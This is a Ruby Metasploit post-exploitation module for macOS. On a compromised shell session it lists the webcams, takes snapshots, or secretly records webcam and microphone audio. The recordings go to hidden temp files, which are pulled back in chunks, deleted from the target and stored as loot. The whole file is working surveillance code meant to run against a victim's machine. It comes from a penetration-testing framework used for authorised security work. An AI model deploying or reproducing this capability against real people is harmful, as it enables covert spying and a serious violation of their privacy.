##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'shellwords'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report
  include Msf::Post::OSX::RubyDL

  POLL_TIMEOUT = 120

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'OSX Manage Webcam',
      'Description'   => %q{
          This module will allow the user to detect installed webcams (with
          the LIST action), take a snapshot (with the SNAPSHOT action), or
          record a webcam and mic (with the RECORD action)
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev'],
      'Platform'      => [ 'osx'],
      'SessionTypes'  => [ 'shell' ],
      'Actions'       => [
        [ 'LIST',     { 'Description' => 'Show a list of webcams' } ],
        [ 'SNAPSHOT', { 'Description' => 'Take a snapshot with the webcam' } ],
        [ 'RECORD', { 'Description' => 'Record with the webcam' } ]
      ],
      'DefaultAction' => 'LIST'
    ))

    register_options(
      [
        OptInt.new('CAMERA_INDEX', [true, 'The index of the webcam to use. `set ACTION LIST` to get a list.', 0]),
        OptInt.new('MIC_INDEX', [true, 'The index of the mic to use. `set ACTION LIST` to get a list.', 0]),
        OptString.new('JPG_QUALITY', [false, 'The compression factor for snapshotting a jpg (from 0 to 1)', "0.8"]),
        OptString.new('TMP_FILE',
          [true, 'The tmp file to use on the remote machine', '/tmp/.<random>/<random>']
        ),
        OptBool.new('AUDIO_ENABLED', [false, 'Enable audio when recording', true]),
        OptString.new('AUDIO_COMPRESSION',
          [true, 'Compression type to use for audio', 'QTCompressionOptionsHighQualityAACAudio']
        ),
        OptString.new('VIDEO_COMPRESSION',
          [true, 'Compression type to use for video', 'QTCompressionOptionsSD480SizeH264Video']
        ),
        OptEnum.new('SNAP_FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(jpg png gif tiff bmp)]
        ),
        OptInt.new('RECORD_LEN', [true, 'Number of seconds to record', 30]),
        OptInt.new('SYNC_WAIT', [true, 'Wait between syncing chunks of output', 5])
      ])
  end

  def run
    fail_with(Failure::BadConfig, "Invalid session ID selected.") if client.nil?
    fail_with(Failure::BadConfig, "Invalid action") if action.nil?

    num_chunks = (datastore['RECORD_LEN'].to_f/datastore['SYNC_WAIT'].to_f).ceil
    tmp_file = datastore['TMP_FILE'].gsub('<random>') { Rex::Text.rand_text_alpha(10)+'1' }
    ruby_cmd = osx_capture_media(
      :action => action.name.downcase,
      :snap_filetype => datastore['SNAP_FILETYPE'],
      :audio_enabled => datastore['AUDIO_ENABLED'],
      :video_enabled => true,
      :num_chunks => num_chunks,
      :chunk_len => datastore['SYNC_WAIT'],
      :video_device => datastore['CAMERA_INDEX'],
      :audio_device => datastore['MIC_INDEX'],
      :snap_jpg_compression => datastore['JPG_QUALITY'].to_f,
      :video_compression => datastore['VIDEO_COMPRESSION'],
      :audio_compression => datastore['AUDIO_COMPRESSION'],
      :record_file => tmp_file,
      :snap_file => tmp_file+datastore['SNAP_FILETYPE']
    )

    output = cmd_exec(['ruby', '-e', ruby_cmd].shelljoin)
    if action.name =~ /list/i
      print_good output
    elsif action.name =~ /record/i
      @pid = output.to_i
      print_status "Running record service with PID #{@pid}"
      (0...num_chunks).each do |i|
        # wait SYNC_WAIT seconds
        print_status "Waiting for #{datastore['SYNC_WAIT'].to_i} seconds"
        Rex.sleep(datastore['SYNC_WAIT'])
        # start reading for file
        begin
          ::Timeout.timeout(poll_timeout) do
            while true
              if File.exist?(tmp_file)
                # read file
                contents = File.read(tmp_file)
                # delete file
                rm_f(tmp_file)
                # roll filename
                base = File.basename(tmp_file, '.*') # returns it with no extension
                num = ((base.match(/\d+$/)||['0'])[0].to_i+1).to_s
                ext = File.extname(tmp_file) || 'o'
                tmp_file = File.join(File.dirname(tmp_file), base+num+'.'+ext)
                # store contents in file
                title = "OSX Webcam Recording "+i.to_s
                f = store_loot(title, "video/mov", session, contents,
                  "osx_webcam_rec#{i}.mov", title)
                print_good "Record file captured and saved to #{f}"
                print_status "Rolling movie file. "
                break
              else
                Rex.sleep(0.3)
              end
            end
          end
        rescue ::Timeout::Error
          fail_with(Failure::TimeoutExpired, "Client did not respond to new file request, exiting.")
        end
      end
    elsif action.name =~ /snap/i
      if output.include?('(RuntimeError)')
        print_error output
        return
      end

      snap_type = datastore['SNAP_FILETYPE']
      img = read_file(tmp_file+snap_type)
      f = store_loot("OSX Webcam Snapshot", "image/#{snap_type}",
        session, img, "osx_webcam_snapshot.#{snap_type}", 'OSX Webcam Snapshot')
      print_good "Snapshot successfully taken and saved to #{f}"
    end
  end

  def cleanup
    return unless @cleaning_up.nil?
    @cleaning_up = true

    if action.name =~ /record/i and not @pid.nil?
      print_status("Killing record service...")
      cmd_exec("/bin/kill -9 #{@pid}")
    end
  end

  private

  def poll_timeout
    POLL_TIMEOUT
  end
end
